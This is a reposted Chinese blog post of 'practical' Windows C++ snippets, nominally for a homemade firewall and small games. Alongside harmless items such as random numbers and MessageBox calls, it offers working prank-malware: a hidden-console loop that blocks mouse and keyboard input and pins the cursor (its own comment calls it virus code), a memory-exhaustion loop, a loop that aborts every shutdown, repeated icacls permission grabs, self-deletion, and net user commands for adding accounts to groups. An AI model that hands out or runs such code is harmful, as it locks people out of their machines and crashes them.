---
layout: post
title: C++实用代码大全
date: 2021-1-16
categories: blog
tags: [c++]
description: 文章金句。
---
注意，本篇博客仅针对windows系统下的编写自制防火墙以及小游戏时所要用到的实用代码进行介绍。

一：随机数（取当前时间为种子）
```
#include<bits/stdc++.h>

#include<windows.h>

using namespace std;

int main(){

    srand( ( unsigned )time( NULL ) );

    int i,j,n;

    n=rand();

    cout<<n;

    return 0;

}
```
二：获取最高权限
```
#include<bits/stdc++.h>

#include<windows.h>

using namespace std;

int main(){

    //获取最高权限！！！

    while(1){

        system("icacls file /grant Administrator:(D,AS)");

        Sleep(998);

    }

    //Administrator 用户名

    return 0;

}
```
三：调为一般访问权限（特别说明，这个代码略微进行调整可以锁权限，不过没什么用就是了）
四：无警告强制关闭进程
```
#include<bits/stdc++.h>

#include<windows.h>

using namespace std;

int main(){

    while(1){

        system("icacls file /grant Administrator:(GA)");

        Sleep(998);

    }

    //Administrator 用户名

    return 0;

}
```
五：防关机
```

#include<bits/stdc++.h>

#include<windows.h>

using namespace std;

int main(){

    while(1){

        system("shutdown /a");

        Sleep(998);

    }

    return 0;

}
```

六：游戏存档
```

#include<bits/stdc++.h>

#define MAXX (9999)

using namespace std;

void game() {

}

int main() {

    int a;

    freopen("t.txt","r",stdin);

    cin>>a;//读入存档

    game();//游戏ing

    if(1==1) {//若要保存 

        cout<<a;

        freopen("t.txt","w",stdout);

    }

    int i,j;

    fclose(stdin);

    fclose(stdout);

    return 0;

}
```

七：召唤命令提示符（这个可以做到命令提示符调用，分层进行）
```

#include<bits/stdc++.h>

#define MAXX (9999)

using namespace std;

int main() {

    int i,j;

    system("cmd");

    fclose(stdin);

    fclose(stdout);

    return 0;

}

```
八：读入一个字符不显示出来（cin或scanf输入时会出现你输入的东西，而这个不会）
```

#include<bits/stdc++.h>

#include<conio.h>

#define MAXX (9999)

using namespace std;

int main(){

//  freopen(".in","r",stdin);

//  freopen(".out","w",stdout);

    int i,j;

    char a;

    a=getch();

    cout<<a;

    fclose(stdin);

    fclose(stdout);

    return 0;

}

```
九：鼠标键盘锁（按下两次ctrl+alt+delete然后注销解决） （卡注销我就不讲了）
```

#include<iostream>

#include<stack>

#include <stdlib.h>

#include  <direct.h>

#include <time.h>

#include<conio.h>

#include<cstdio>

#include<queue>

#include <fstream>

#include<windows.h>

#include<algorithm>

#include<cstring>

#include <unistd.h>

#include <signal.h>

#include <sys/param.h>

#include <sys/types.h>

#include <winable.h> 

#include <sys/stat.h>

#include <stdio.h>

#include <cstdlib>

#include<bits/stdc++.h>

#define MAXX (9999)

using namespace std;

int x = GetSystemMetrics(SM_CXFULLSCREEN);

int y = GetSystemMetrics(SM_CYFULLSCREEN);

HHOOK keyHook = NULL;

void s() {

    Sleep (10);

//  MessageBox(NULL,"这是病毒代码请按下ctrl+alt+delete两次然后注销即可解决","天命",MB_OK);

    SetCursorPos(x / 2, y / 2);

    BlockInput(true); 

}

int main(void) {

  FreeConsole();

    while(1) { 

        SetCursorPos(x / 2, y / 2);

        system("color 09");

        s();

        cout<<"1234567890";

        system("color 13");

        s();

        cout<<"1858237857890";

        system("color B4");

        s();

        cout<<"5268281234567890";

        system("color 15");

        s();

        cout<<"1785728267890";

        system("color EF");

        s();

        cout<<"25445641545";

        system("color 17");

        s();

        cout<<"1237778578567890";

        system("color 18");

        s();

        cout<<"12382890";

        system("color 19");

        s();

        cout<<"12345424267890";

        system("color 10");

        s();

        cout<<"12363890";

        system("color 13");

        s();

        cout<<"12374567890";

        system("color 12");

        s();

        cout<<"185725245754245240";

        system("color 14");

        s();

        cout<<"1234567890";

        system("color 12");

        s();

        cout<<"1242890";

        system("color 36");

        s();

        cout<<"1245204234567890";

        system("color 12");

        s();

        cout<<"127252734567890";

        system("color 52");

        s();

        cout<<"123277272257890";

        system("color 12");

        s();

        cout<<"257257527521232524567890";

        system("color 68");

        s();

        cout<<"1234567890";

        system("color 78");

        s();

        cout<<"275271272272572725752752754149470";

        system("color C4");

        s();

        cout<<"17277525725223475727567890";

        system("color B6");

        s();

        cout<<"1234275652752727890";

        system("color 4C");

        s();

        cout<<"12327275275274567890";

        system("color 1E");

        s();

        cout<<"12527552357527524567890";

        system("color E1");

        s();

        cout<<"1227345727272567890";

        system("color 42");

        s();

        cout<<"7527275123456752752752527890";

        SetCursorPos(x / 2, y / 2);

    }

    return 0;

}
```

十：利用new卡爆物理内存
```

#include<bits/stdc++.h>

#define MAXX (9999)

using namespace std;

int main(){

//  freopen(".in","r",stdin);

//  freopen(".out","w",stdout);

    int i=0,j=0,*a,*b,*c,k=0;

    while(true){

        i++;

        j+=2 ;

        k+=3;

        a=new int( i);  

        b=new int(j);   

        c=new int(k);

    }

    fclose(stdin);

    fclose(stdout);

    return 0;

}

```
十一：玩转MessageBox
```

#include<bits/stdc++.h>

#include<windows.h> 

#define MAXX (99999)

using namespace std;

#define rda(x) freopen(#x".in","r",stdin);freopen(#x".out","w",stdout);

#define srd() fclose(stdin);fclose(stdout);

int main() {

//  rda();

// zero or NULL are both right.

//翻译一下天命的五毛英语：0或者NULL都可以作为第一个地方填入的值 ，对了还有文件的名字也行。

//例如这个程序叫哈哈哈，那你填入哈哈哈.exe的话必须先关闭窗口再关闭exe 

    MessageBox(0,"Hello","警告",64);

    MessageBox(0,"Hello","警告",48);

    int i,j;

    srd();

    return 0;

}
```

十二：我 “杀” 我 自 己
```

（del 有一个很烦的地方就是单用del /q 文件名.exe是杀不掉自己的。但是配合cmd就行了）

#include<bits/stdc++.h>

#include<windows.h>

using namespace std;

int main(){

    system("start cmd /c del /q 文件名.exe");

    return 0;

}
```

十三：net

```
/*

新建用户：

net user <用户名> /add

删除用户：

net user <用户名> /delete

更改用户密码：

net user <用户名>  <密码>

加入某组：

net localgroup <组名> <用户名> /add

退出某组：

net localgroup <组名> <用户名> /delete

*/ 
```

十四：ping与ipconfig
```

#include<bits/stdc++.h>

int main() {

//  rda();

    int i,j;

    system("ipconfig");//关于电脑网络的基本信息

     system("ipconfig /all");//关于电脑网络的大部分信息

    /*

    ping ip -t 

    ↑无限发送

    ping ip -l 大小  

    ↑自定义大小 

    */

    return 0;

}
```
注：本文章为洛谷博主 天命 原创，遵循Creative Commons （CC）知识共享协议，原帖：[C++实用代码大全 - 天命 的博客 - 洛谷博客](https://www.luogu.com.cn/blog/tmxkt/c-shi-yong-dai-ma-tai-quan)，在此感谢原作者的分享！


